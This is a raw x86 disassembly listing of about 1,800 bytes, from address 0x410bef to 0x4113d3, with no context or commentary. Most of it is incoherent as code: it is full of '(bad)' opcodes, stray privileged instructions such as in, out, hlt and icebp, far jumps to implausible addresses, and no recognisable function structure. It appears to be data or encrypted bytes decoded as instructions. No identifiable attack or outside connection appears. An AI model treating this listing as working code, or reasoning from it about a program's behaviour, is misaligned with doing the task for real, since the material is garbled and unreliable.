  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
